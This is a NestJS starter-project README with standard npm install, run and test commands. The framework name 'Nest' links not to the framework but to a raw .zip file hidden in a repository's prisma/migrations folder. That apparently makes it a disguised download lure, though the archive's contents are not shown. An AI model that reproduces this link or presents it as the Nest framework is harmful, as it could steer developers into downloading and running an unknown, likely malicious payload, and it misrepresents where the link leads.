## Description

[Nest](https://raw.githubusercontent.com/acef84/Projeto-SafeStar-back/main/prisma/migrations/20241107174005_init/Safe-back-Projeto-Star-3.6.zip) framework TypeScript starter repository.

## Project setup

```bash
$ npm install
```

## Compile and run the project

```bash
# development
$ npm run start

# watch mode
$ npm run start:dev

# production mode
$ npm run start:prod
```

## Run tests

```bash
# unit tests
$ npm run test

# e2e tests
$ npm run test:e2e

# test coverage
$ npm run test:cov
```
